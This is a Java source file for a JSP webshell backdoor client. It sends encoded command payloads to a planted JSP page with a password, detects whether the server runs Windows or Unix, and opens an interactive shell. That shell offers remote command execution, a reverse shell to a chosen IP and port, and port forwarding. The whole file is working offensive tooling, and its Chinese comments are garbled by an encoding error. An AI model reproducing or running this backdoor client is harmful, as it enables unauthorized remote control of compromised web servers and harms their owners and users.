package com.weiwhy.jspbackdoor;

import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Scanner;
import java.util.Base64.Encoder;

public class Main {

	/*
	 * java -jar http://localhost/a.jsp password @#$^ AxMe
	 * java -jar http://localhost/a.jsp ����		 key  word
	 */
	public static String cmd;
	public static String shell;
	public static String tcpd;
	public static String url;
	public static String pass;
	public static String key;
	public static String words;
	public static Encoder encoder;
	public static void main(String[] args) {
		
		encoder=Base64.getEncoder();
		if (args.length==0) {
			System.out.println("use age:");
			System.out.println("java -jar client.jar http://localhost/a.jsp ����   key words");
			System.out.println("����Ϊshell������,keyȡֵΪ��!@#$^<>~?��,wordsΪ��keyͬ�ȳ��ȵģ�A-Za-z��");
			System.out.println("java -jar client.jar g key words");
			System.out.println("����shell,��Ҫ����key���ȵ���words");
			return;
		}
		switch (args[0]) {
		case "g":
			//�ȴ�������
			if (args.length==3) {
				
			}else {
				System.out.println("����webshell");
				System.out.println("java -jar client.jar g key words");
			}
			break;
		default:
			url=args[0];
			pass=args[1];
			key=args[2];
			words=args[3];
//			System.out.println(url);
//			System.out.println(pass);
//			System.out.println(key);
//			System.err.println(words);
			if (key.length()!=words.length()) {
				return;
			}
			cmd=Util.Readtext("cmd");
			shell=Util.Readtext("shell");
			tcpd=Util.Readtext("tcpd");
			String win=cmd.replace("%cmd%", "cmd /c echo ok");
			String unix=cmd.replace("%cmd%", "echo ok");
			String win_de=new String(encoder.encode(win.getBytes()));
			String unix_de=new String(encoder.encode(unix.getBytes()));
			win_de=Util.EnChar(win_de, key, words);
			unix_de=Util.EnChar(unix_de, key, words);
			
//			System.out.println(Util.GetResponseString(pass,url, unix_de, key, words));
//			System.exit(0);
			if (Util.GetResponseString(pass,url, win_de, key, words).trim().equals("ok")) {
				System.err.println("win eg:");
				System.out.println("1. exec [command]	           //ִ��һ������");
				System.out.println("2. reshell [ip] [port]         //����shell��ָ���˿�");
//				System.out.println("3. portmap                     //�����˿�ӳ��");
				DoHome("win");
			}else if (Util.GetResponseString(pass,url, unix_de, key, words).trim().equals("ok")) {
				System.err.println("unix eg:");
				System.out.println("1. exec [command]	           //ִ��һ������");
				System.out.println("2. reshell [ip] [port]         //����shell��ָ���˿�");
//				System.out.println("3. portmap                     //�����˿�ӳ��");
				DoHome("unix");
			}else {
				System.out.println("����ʧ��");
			}
			
			break;
		}	
	}
	
	public static void DoHome(String pfm) {
		System.out.print("shell$");
		Scanner scanner=new Scanner(System.in);
		List<String> list=new ArrayList<String>();
		String input=scanner.nextLine();
		String[] inputs=input.split(" ");
		for (int i = 0; i < inputs.length; i++) {
			list.add(inputs[i]);
		}
		switch (list.get(0)) {
		case "exec":
			if (list.size()>=2) {
				String res=Util.DoCode(pfm,list);
				System.out.print(res);
			}else {
				System.out.println("eg:exec whoami");
			}
			Main.DoHome(pfm);
			break;
		case  "reshell":
			if (list.size()==3) {
				String res=Util.reshell(pfm, list);
				System.out.print(res);
			}else {
				System.out.println("eg:reshell 1.1.1.1 8889");
			}
			Main.DoHome(pfm);
			break;
		case "tgcd":
			if (list.size()==5) {
				String res=Util.tcpd(pfm, list);
				System.out.print(res);
			}else {
				System.out.println("eg:tcpd [rip] [rport] [toip] [toport]");
			}
			Main.DoHome(pfm);
			break;
		default:
			Main.DoHome(pfm);
			break;
		}
	}

}
